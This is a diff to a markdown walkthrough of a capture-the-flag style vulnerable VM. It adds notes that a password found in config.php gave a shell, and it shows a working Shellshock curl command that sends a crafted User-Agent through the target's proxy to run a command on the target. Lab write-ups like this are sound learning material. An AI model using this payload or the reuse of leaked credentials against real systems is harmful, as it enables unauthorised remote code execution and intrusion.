@@ -80,12 +80,16 @@ To find IP address of VM:
 
 ### Method 2: Using config.php
 
-#### config.php
+#### Config.php
 ![](Assets/14.png)
+
+> Got password john@123
+
 ![](Assets/15.png)
 
+> john@123 password worked >> Got shell
 
-Method 3: Get a shell using shellshock
+### Method 3: Get a shell using shellshock
 
 curl --proxy 192.168.1.11:3128 http://192.168.1.11/cgi-bin/status -H "User-Agent: () { pwned;}; echo 'Content-Type: text/plain'; echo; /usr/bin/whoami; exit"
 
